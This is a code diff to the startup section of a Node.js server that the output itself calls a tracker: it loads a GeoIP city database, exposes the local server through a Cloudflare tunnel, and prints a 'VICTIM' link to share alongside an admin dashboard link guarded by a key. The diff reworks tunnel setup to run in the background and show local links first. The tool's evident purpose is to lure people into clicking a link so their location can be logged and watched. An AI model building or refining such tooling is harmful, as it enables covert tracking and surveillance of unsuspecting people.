@@ -29,6 +29,8 @@ app.use("/", require("./router"))
 app.use("/", require("./liveweather"))
 
 server.listen(PORT, async () => {
+    console.log(`✅ Server listening on http://localhost:${PORT}`)
+    
     // Initialize GeoIP reader
     const dbPath = path.join(__dirname, "geoip", "GeoLite2-City.mmdb")
     if (fs.existsSync(dbPath)) {
@@ -40,20 +42,51 @@ server.listen(PORT, async () => {
         }
     } else {
         console.warn("⚠️  GeoIP database not found at", dbPath)
-        console.log("📥 Download from: https://dev.maxmind.com/geoip/geolite2-city/")
+        console.log("📥 Run: npm run setup-geoip")
     }
 
     const localURL = `http://localhost:${PORT}`
-    remoteURL = await cloudflaredTunnel({
-        "--url": localURL
-    }).url
-
-    console.log(`\n=== TRACKER LINKS ===`)
-    console.log(`\n🎯 VICTIM (Share this link):`)
-    console.log(`   LOCAL:  ${localURL}`)
-    console.log(`   REMOTE: ${remoteURL}`)
-    console.log(`\n👁️  ADMIN DASHBOARD:`)
-    console.log(`   LOCAL:  ${localURL}/admin?key=${config.adminKey}`)
-    console.log(`   REMOTE: ${remoteURL}/admin?key=${config.adminKey}`)
-    console.log(`\n=====================\n`)
+    
+    // Setup tunnel in background
+    ;(async () => {
+        try {
+            console.log("🌐 Initializing Cloudflare tunnel...")
+            const tunnel = await cloudflaredTunnel({
+                "--url": localURL
+            })
+            
+            // The tunnel object itself might be a Promise, need to get the URL
+            let remoteUrl
+            if (tunnel && typeof tunnel === 'object') {
+                // Try different possible property names
+                remoteUrl = tunnel.url || tunnel.publicUrl || tunnel || String(tunnel)
+            }
+            
+            // If it's still a promise, await it
+            if (remoteUrl && typeof remoteUrl.then === 'function') {
+                remoteUrl = await remoteUrl
+            }
+            
+            global.remoteURL = remoteUrl
+            console.log(`✅ Tunnel ready: ${global.remoteURL}`)
+            
+            console.log(`\n=== REMOTE LINKS NOW ACTIVE ===`)
+            console.log(`🎯 VICTIM: ${global.remoteURL}`)
+            console.log(`👁️  ADMIN:  ${global.remoteURL}/admin?key=${config.adminKey}`)
+            console.log(`================================\n`)
+        } catch (err) {
+            console.warn("⚠️  Tunnel failed:", err.message)
+            console.log("📍 Using LOCAL access only\n")
+        }
+    })()
+    
+    // Show local links immediately
+    setTimeout(() => {
+        console.log(`\n=== LOCAL LINKS (AVAILABLE NOW) ===`)
+        console.log(`\n🎯 VICTIM:`)
+        console.log(`   ${localURL}`)
+        console.log(`\n👁️  ADMIN DASHBOARD:`)
+        console.log(`   ${localURL}/admin?key=${config.adminKey}`)
+        console.log(`\n=====================================\n`)
+    }, 500)
 })
